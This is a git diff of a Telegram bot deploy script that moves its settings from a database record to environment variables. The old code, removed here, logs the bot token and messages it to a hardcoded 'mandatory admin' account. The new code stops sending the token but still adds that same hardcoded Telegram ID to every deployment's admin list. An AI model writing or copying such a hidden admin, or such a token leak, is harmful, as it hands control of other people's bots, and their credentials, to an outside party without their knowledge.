@@ -1,8 +1,7 @@
-import logging
 import os
 import sys
+import logging
 from pyrogram import Client, idle
-from db_config import users_col
 
 logging.basicConfig(
     level=logging.INFO,
@@ -10,50 +9,29 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Get deploy user ID from env
 USER_ID = int(os.getenv("DEPLOY_USER_ID", 0))
 logger.info(f"🔧 Deploying bot for USER_ID: {USER_ID}")
 
-# Load user config from database
-user = users_col.find_one({"USER_ID": USER_ID})
-if not user:
-    logger.error(f"❌ User {USER_ID} config not found in database!")
-    sys.exit(1)
-
-# Load required variables from DB
-API_ID = user.get("API_ID")
-API_HASH = user.get("API_HASH")
-BOT_TOKEN = user.get("BOT_TOKEN")
+# Load config directly from env
+API_ID = os.getenv("API_ID")
+API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 if not all([API_ID, API_HASH, BOT_TOKEN]):
-    logger.error("❌ Missing required API_ID, API_HASH, or BOT_TOKEN. Aborting deployment.")
+    logger.error("❌ Missing required environment variables!")
     sys.exit(1)
 
-# Log the bot token for confirmation (be cautious with this in production!)
-logger.info(f"🔐 Using BOT_TOKEN: {BOT_TOKEN}")
-
-# Other config variables
-ENABLE_FSUB = user.get("ENABLE_FSUB", False)
-VERIFICATION_MODE = user.get("VERIFICATION_MODE", False)
-MONGO_URI = user.get("MONGO_URI", "")
-DB_NAME = user.get("DB_NAME", "")
-FSUB = user.get("FSUB", "")
-PREMIUM_HOURS_VERIFICATION = user.get("PREMIUM_HOURS_VERIFICATION", 12)
-VERIFY_SLUG_TTL_HOURS = user.get("VERIFY_SLUG_TTL_HOURS", 12)
-SHORTENER_DOMAIN = user.get("SHORTENER_DOMAIN", "")
-SHORTENER_API = user.get("SHORTENER_API_KEY", "")
-CAPTION = user.get("CAPTION", "")
-
-# Handle ADMINS from DB
-raw_admins = user.get("ADMINS", [])
-if isinstance(raw_admins, list):
-    ADMINS = [int(admin) for admin in raw_admins]
-elif isinstance(raw_admins, str):
-    ADMINS = [int(x.strip()) for x in raw_admins.split() if x.strip().isdigit()]
-else:
-    ADMINS = []
-
-# Ensure mandatory admin is always added
+ENABLE_FSUB = os.getenv("ENABLE_FSUB") == "True"
+VERIFICATION_MODE = os.getenv("VERIFICATION_MODE") == "True"
+MONGO_URI = os.getenv("MONGO_URI", "")
+DB_NAME = os.getenv("DB_NAME", "")
+FSUB = os.getenv("FSUB", "")
+PREMIUM_HOURS_VERIFICATION = int(os.getenv("PREMIUM_HOURS_VERIFICATION", 12))
+VERIFY_SLUG_TTL_HOURS = int(os.getenv("VERIFY_SLUG_TTL_HOURS", 12))
+SHORTENER_DOMAIN = os.getenv("SHORTENER_DOMAIN", "")
+SHORTENER_API = os.getenv("SHORTENER_API_KEY", "")
+CAPTION = os.getenv("CAPTION", "")
+ADMINS = [int(x) for x in os.getenv("ADMINS", "").split() if x.strip().isdigit()]
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
 
 app = Client(
@@ -70,14 +48,13 @@ if __name__ == "__main__":
 
     me = app.get_me()
     BOT_USERNAME = me.username
-    logger.info("🚀 Bot deployed successfully!")
     logger.info(f"✅ Bot started as @{BOT_USERNAME}")
 
     for admin_id in FINAL_ADMINS:
         try:
             app.send_message(
                 admin_id,
-                f"✅ Deployed bot started as @{BOT_USERNAME} for USER_ID {USER_ID}.\n\n🔐 BOT_TOKEN: `{BOT_TOKEN}`"
+                f"✅ Deployed bot started as @{BOT_USERNAME} for USER_ID {USER_ID}."
             )
             logger.info(f"📨 Startup message sent to admin {admin_id}")
         except Exception as e:
